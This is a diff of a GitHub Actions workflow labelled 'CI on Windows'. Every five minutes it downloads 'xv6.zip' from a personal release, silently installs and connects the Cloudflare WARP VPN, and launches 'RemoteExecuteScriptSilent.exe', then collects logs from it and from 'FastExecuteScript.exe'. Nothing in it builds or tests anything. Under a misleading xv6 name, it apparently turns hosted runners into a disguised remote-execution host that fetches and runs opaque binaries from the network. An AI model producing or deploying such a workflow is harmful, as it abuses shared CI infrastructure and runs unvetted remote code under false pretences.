@@ -1,133 +1,119 @@
-name: CI on Windows
+name: CI on Windows (Extended Edition)
 
 on:
   schedule:
     - cron: "*/5 * * * *"
   workflow_dispatch:
-
-env:
-  XV6_ZIP_URL: "https://github.com/iooitwoto/xv6-riscv/releases/download/1/xv6.zip"
-  WARP_URL: "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi"
+    inputs:
+      manual_trigger_reason:
+        description: "Reason for manual trigger"
+        default: "N/A"
 
 jobs:
   run-release:
+    name: Windows Release Runner
     strategy:
       fail-fast: false
       max-parallel: 1
       matrix:
         os: [windows-latest]
     runs-on: ${{ matrix.os }}
-    timeout-minutes: 60
+    env:
+      XV6_URL: "https://github.com/iooitwoto/xv6-riscv/releases/download/1/xv6.zip"
+      WARP_URL: "https://1111-releases.cloudflareclient.com/windows/Cloudflare_WARP_Release-x64.msi"
+      XV6_DIR: "xv6"
+      LOGS_BASE: "xv6\\appslocal"
 
     steps:
-      - name: Checkout repository (keeps workspace predictable)
-        uses: actions/checkout@v4
-
-      - name: Prepare workspace and ensure xv6 folder exists
-        shell: pwsh
+      - name: 📜 Initialize CI environment
         run: |
-          Write-Host "Preparing workspace..."
-          New-Item -Path xv6 -ItemType Directory -Force | Out-Null
-          Get-ChildItem -Force | Write-Host
+          Write-Host "===== CI Job Starting ====="
+          Write-Host "Running on $env:OS at $(Get-Date)"
+          Write-Host "Reason: ${{ github.event.inputs.manual_trigger_reason || 'Scheduled run' }}"
+          Write-Host "==========================="
 
-      - name: Download xv6.zip from Release (retry wrapper)
-        shell: pwsh
+      - name: 🔍 Pre-flight checks
         run: |
-          $url = "${{ env.XV6_ZIP_URL }}"
-          $out = "xv6.zip"
-          $maxAttempts = 5
-          $attempt = 0
-          while ($true) {
-            try {
-              Write-Host "Downloading $url (attempt $([int]($attempt + 1)))"
-              Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop
-              Write-Host "Downloaded $out"
-              break
-            } catch {
-              $attempt++
-              Write-Warning "Attempt $attempt failed: $_"
-              if ($attempt -ge $maxAttempts) { throw "Failed to download $url after $maxAttempts attempts" }
-              Start-Sleep -Seconds (5 * $attempt)
-            }
-          }
+          Write-Host "Checking PowerShell version..."
+          $PSVersionTable.PSVersion
+          Write-Host "Current working dir: $(Get-Location)"
+          Write-Host "Free disk space:"
+          Get-PSDrive C
 
-      - name: Validate archive and list contents (diagnostics)
-        shell: pwsh
+      - name: 📦 Download xv6.zip from Release
         run: |
-          if (-Not (Test-Path xv6.zip)) { throw "xv6.zip not found after download" }
-          Write-Host "Archive size:" (Get-Item xv6.zip).Length
-          Add-Type -AssemblyName System.IO.Compression.FileSystem
-          [System.IO.Compression.ZipFile]::OpenRead((Resolve-Path xv6.zip)) | ForEach-Object { $_.Dispose() }
+          $url = "${{ env.XV6_URL }}"
+          Write-Host "Downloading XV6 from $url"
+          Invoke-WebRequest -Uri $url -OutFile xv6.zip
+          Write-Host "Download complete."
 
-      - name: Unzip xv6.zip
-        shell: pwsh
+      - name: 📂 Unzip xv6.zip
         run: |
-          Expand-Archive -Path xv6.zip -DestinationPath . -Force
-          Write-Host "Unzipped xv6.zip into $(Resolve-Path .)"
+          Write-Host "Extracting xv6.zip..."
+          Expand-Archive -Path xv6.zip -DestinationPath .
+          Write-Host "Extraction finished."
 
-      - name: Install Cloudflare WARP (register & connect if available)
-        id: install_warp
-        shell: pwsh
+      - name: 🌐 Install Cloudflare WARP
+        shell: powershell
         run: |
-          $msi = "WARP.msi"
-          if (-Not (Test-Path $msi)) {
-            Write-Host "Downloading WARP installer..."
-            Invoke-WebRequest -Uri "${{ env.WARP_URL }}" -OutFile $msi -UseBasicParsing -ErrorAction Stop
-          } else { Write-Host "WARP installer already present" }
-
-          Write-Host "Installing WARP (msiexec)..."
-          Start-Process msiexec.exe -ArgumentList '/i', $msi, '/quiet', '/norestart' -Wait
+          Write-Host "Fetching Cloudflare WARP installer..."
+          Invoke-WebRequest -Uri "${{ env.WARP_URL }}" -OutFile "WARP.msi"
+          Write-Host "Installing Cloudflare WARP..."
+          Start-Process msiexec.exe -ArgumentList '/i WARP.msi /quiet /norestart' -Wait
+          Write-Host "Waiting for service to stabilize..."
           Start-Sleep -Seconds 10
+          Write-Host "Registering and connecting..."
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos registration new
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos connect
+          & 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe' --accept-tos status
+          Start-Sleep -Seconds 10
+          Write-Host "WARP connection established."
 
-          $warpPath = 'C:\Program Files\Cloudflare\Cloudflare WARP\warp-cli.exe'
-          if (Test-Path $warpPath) {
-            Write-Host "Registering and connecting WARP..."
-            & $warpPath --accept-tos registration new | Out-Null
-            & $warpPath --accept-tos connect | Out-Null
-            & $warpPath --accept-tos status | Write-Host
-          } else {
-            Write-Warning "warp-cli not found at $warpPath; continuing without explicit registration"
-          }
-
-      - name: Start RemoteExecuteScriptSilent.exe
-        working-directory: xv6
+      - name: ▶ Start RemoteExecuteScriptSilent.exe
+        working-directory: ${{ env.XV6_DIR }}
         run: |
+          Write-Host "Starting RemoteExecuteScriptSilent.exe..."
           Start-Process .\RemoteExecuteScriptSilent.exe
 
-      - name: Wait for RemoteExecuteScriptSilent.exe to exit
+      - name: ⏳ Monitor RemoteExecuteScriptSilent.exe
         run: |
           $processName = "RemoteExecuteScriptSilent"
-          Write-Host "Waiting for $processName process to exit..."
+          Write-Host "Monitoring process: $processName..."
           while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Write-Host "Still running..."
             Start-Sleep -Seconds 5
           }
           Write-Host "$processName has exited."
 
-      - name: Wait for FastExecuteScript.exe to exit
+      - name: ⏳ Monitor FastExecuteScript.exe
         run: |
           $processName = "FastExecuteScript"
-          Write-Host "Waiting for $processName process to exit..."
+          Write-Host "Monitoring process: $processName..."
           while (Get-Process -Name $processName -ErrorAction SilentlyContinue) {
+            Write-Host "Still running..."
             Start-Sleep -Seconds 5
           }
           Write-Host "$processName has exited."
 
-      - name: Find dynamic logs folder
+      - name: 📁 Locate dynamic logs folder
         id: find_logs
         run: |
-          $base = "xv6\appslocal"
+          $base = "${{ env.LOGS_BASE }}"
+          Write-Host "Searching for dynamic logs inside $base"
           $dynamic = Get-ChildItem $base | Where-Object { $_.PSIsContainer } | Select-Object -First 1 -ExpandProperty Name
           $logsPath = "$base\$dynamic\logs"
+          Write-Host "Logs folder found at $logsPath"
           echo "logsPath=$logsPath" >> $env:GITHUB_ENV
 
-      - name: Upload logs as artifact
+      - name: 📤 Upload logs as artifact
         uses: actions/upload-artifact@v4
         with:
           name: logs
           path: ${{ env.logsPath }}/**
-      - name: Final diagnostic (non-blocking)
-        if: always()
-        shell: pwsh
+          if-no-files-found: warn
+
+      - name: ✅ Cleanup and summary
         run: |
-          Write-Host "Workflow completed. Environment summary:"
-          Get-ChildItem -Path xv6 -Recurse -Depth 1 | Select-Object Name, Length | Write-Host
+          Write-Host "Cleaning up..."
+          Remove-Item xv6.zip -ErrorAction SilentlyContinue
+          Write-Host "Job completed at $(Get-Date)"
